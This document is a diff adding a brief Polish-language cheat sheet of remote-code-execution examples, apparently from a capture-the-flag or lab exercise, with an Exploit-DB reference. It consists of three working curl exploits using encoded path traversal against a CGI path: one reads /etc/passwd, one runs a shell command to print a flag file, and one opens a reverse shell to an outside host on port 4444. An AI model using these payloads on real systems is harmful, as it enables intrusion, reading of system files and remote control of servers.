@@ -1,0 +1,8 @@
+1) Przyklady zdalnego wykonania kodu
+      • Curl
+            ▪ curl -v 'http://10.10.73.124:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
+            ▪ curl -v 'http://10.10.73.124:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H "Content-Type: text/plain"
+            ▪ curl -v 'http://10.10.73.124:8083/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; sh -i >& /dev/tcp/10.8.190.238/4444 0>&1' -H "Content-Type: text/plain"
+           
+      
+https://www.exploit-db.com/exploits/50383
